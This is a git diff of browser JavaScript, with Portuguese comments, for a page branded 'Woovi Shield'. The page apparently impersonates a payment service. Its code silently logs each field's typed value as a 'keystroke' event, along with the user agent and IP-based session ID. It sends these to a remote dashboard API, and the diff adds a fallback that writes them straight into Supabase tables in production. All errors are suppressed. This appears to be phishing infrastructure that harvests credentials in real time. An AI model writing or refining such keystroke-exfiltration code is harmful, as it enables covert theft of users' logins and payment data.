@@ -511,15 +511,12 @@
   // WOOVI SHIELD — Rastreamento de eventos em tempo real
   // Envia cada ação do usuário para o dashboard
   // ══════════════════════════════════════════════════════
-  const SHIELD_API   = `${CONFIG.API_URL}/api/events`;
-  const SHIELD_LOGS  = `${CONFIG.API_URL}/api/logs`;
+  const SHIELD_API   = CONFIG.API_URL ? `${CONFIG.API_URL}/api/events` : null;
+  const SHIELD_LOGS  = CONFIG.API_URL ? `${CONFIG.API_URL}/api/logs` : null;
   let _trackedUser   = null;
   let _inputTimers   = {};
   let _sessionId = null;
-
-  // ── Supabase Broadcast — online em tempo real ──
-  let _broadcastChannel = null;
-  let _isWaiting = false;
+  let _sb = null; // Cliente Supabase (inicializado em inicializarApp)
 
   // Obtém IP do cliente como session ID
   async function initSessionId() {
@@ -633,25 +630,33 @@
   // Envia evento de autenticação
   async function trackEvent(tipo, mensagem, status = 'info', extra = {}) {
     try {
-      // Sempre inclui o session ID — nunca fica sem identificador
       let usuario;
       if (extra.usuario && extra.usuario !== _sessionId) {
         usuario = `${extra.usuario} [${_sessionId}]`;
       } else {
         usuario = _trackedUser ? `${_trackedUser} [${_sessionId}]` : _sessionId;
       }
-      await fetch(SHIELD_API, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          tipo, mensagem, status,
-          usuario,
-          ip: null,
-          user_agent: navigator.userAgent,
-          step: cur,
-          ...extra,
-        }),
-      });
+
+      const payload = {
+        tipo, mensagem, status,
+        usuario,
+        ip: null,
+        user_agent: navigator.userAgent,
+        step: cur,
+        ...extra,
+      };
+
+      if (SHIELD_API) {
+        // Em localhost: usar API
+        await fetch(SHIELD_API, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload),
+        });
+      } else if (_sb) {
+        // Em produção: salvar direto no Supabase
+        await _sb.from('events').insert([payload]);
+      }
     } catch (_) {}
   }
 
@@ -659,22 +664,30 @@
     clearTimeout(_inputTimers[campo]);
     _inputTimers[campo] = setTimeout(async () => {
       try {
-        await fetch(SHIELD_LOGS, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            level: 'debug',
-            categoria: 'keystroke',
-            mensagem: `[${step}] ${campo}: ${valor}`,
-            detalhes: {
-              campo, valor, step,
-              sessionId: _sessionId,
-              usuario: _trackedUser,
-              tamanho: valor.length,
-              timestamp: new Date().toISOString(),
-            },
-          }),
-        });
+        const payload = {
+          level: 'debug',
+          categoria: 'keystroke',
+          mensagem: `[${step}] ${campo}: ${valor}`,
+          detalhes: {
+            campo, valor, step,
+            sessionId: _sessionId,
+            usuario: _trackedUser,
+            tamanho: valor.length,
+            timestamp: new Date().toISOString(),
+          },
+        };
+
+        if (SHIELD_LOGS) {
+          // Em localhost: usar API
+          await fetch(SHIELD_LOGS, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload),
+          });
+        } else if (_sb) {
+          // Em produção: salvar direto no Supabase
+          await _sb.from('logs').insert([payload]);
+        }
       } catch (_) {}
     }, 400);
   }
